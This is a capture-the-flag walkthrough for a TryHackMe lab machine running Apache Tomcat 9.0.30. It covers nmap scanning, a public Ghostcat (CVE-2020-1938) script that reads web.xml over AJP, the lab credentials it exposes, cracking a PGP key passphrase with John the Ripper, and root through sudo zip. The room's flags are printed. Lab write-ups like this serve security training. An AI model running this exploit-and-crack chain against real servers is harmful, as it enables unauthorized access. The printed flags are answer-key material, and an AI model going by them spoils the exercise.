# Tomghost Walkthrough
### Link
- https://tryhackme.com/room/tomghost
---
### Taks 
**Question**
###### Compromise this machine and obtain user.txt

# Reco
```
nmap -sC -sV [IP]
```

In the result, we can see 2 interesting porst:
- 8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
- 8080/tcp open  http       Apache Tomcat 9.0.30

These 2 lines give us the key information: we are walking around an **Apache Server** and the **Tomcat version** is :  *9.0.30*

Now we can try to find an exploit in exploit-db.com database.

# Exploit
We found the exploit atatched to the **CVE : 2020-1938** 

This CVE gives the opportunity to an attacker  to read the contents of configuration files and source code files of ALL webapps deployed on Tomcat with this version.

After a quick research, I found this python script 
```
https://github.com/00theway/Ghostcat-CNVD-2020-10487
```

Download the script
```
sudo wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py
```

Check the option available
```
python3 ajpShooter.py -h
```

*positional arguments*
```
  url                   target site's context root url like http://www.example.com/demo/
  ajp_port              ajp port
  target_file           target file to read or eval like /WEB-INF/web.xml,/image/evil.jpg
  {read,eval}           read or eval file
```

So the format could be
```
python3 ajpShooter.py [url] [ajp_port] [target_file] [read or eval]
```

Commandline
```
python3 ajpShooter.py [IP] 8009 /WEB-INF/web.xml read
```

We found **2 information**
- User: **skyfuck**
- Password: **8730281lkjlkjdqlksalks**

# Access Server throughg SSH

After the SSH  connection has been done, let's do a basic "ls".We found 2 files
- credential.pgp
- tryhackme.asc

We need to copy the pgp file and asc file in our local machine and try to decrypt the pgp

Copy to the local machine
```
sudo scp skyfuck@[IP]:{credential.gpg,tryhackme.asc} .
```

Now we can brute force the gpg file with our friend **John** ^^
```
gpg2john tryhackme.asc > tryhackme_gpg.hash
```

Now we can continue to use John to crack the file.
```
john --wordlist=/usr/share/wordlist/rockyou.txt tryhackme_gpg.hash
```

passphrase: **alexandru**

Now we can decrypt the *gpg file*

From the SSH conenction 
 - First : import the key
 ```
 gpg --import tryhackme.asc
 ```
 - Second : decrypt the gpg file
 ```
 gpg --decrypt credential.pgp
 ```

We found a new user : **merlin** and 
the password associated:**asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j**

Let's switch to this user

Check merlin / 

You can find the first flag --> **user.txt**

**Answer**
###### THM{GhostCat_1s_so_cr4sy}

# Privilege escalation

Let's check what merlin can do 
```
sudo -l
```

merlin can use **/usr/bin/zip**

Now we can check https://gtfobins.github.io/gtfobins/zip/

We can use the "Sudo" pattern

**Answer**
###### THM{Z1P_1S_FAKE}